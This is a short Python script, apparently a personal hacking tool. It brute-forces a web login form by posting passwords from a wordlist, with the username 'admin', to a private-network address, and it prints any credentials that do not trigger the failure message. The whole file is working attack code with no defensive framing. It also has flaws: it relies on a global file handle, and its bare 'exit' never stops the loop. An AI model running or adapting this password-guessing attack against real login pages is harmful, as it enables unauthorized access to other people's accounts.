import requests
def bruteforce(username,url):
    for k in k1:
        k = k.strip()
        print ('[!!] trying to bruteforce password ' + k)
        data_dictionary = {'name':username, 'password':k, 'Login':'return false'}
        resp = requests.post(url, data_dictionary)
        if "Authentication failed: invalid username or password." in str(resp.content):
#        if "Authentication failed: invalid username or password." in resp.content:

            pass
        else:
            print("[+] username is: " + username)
            print("[+] pasword is: " + k)
            exit

url = 'http://10.0.0.1:8080/'
username = 'admin'

with open('/root/Adam-bruteforce-py/k1.txt','r') as k1:
    bruteforce(username,url)
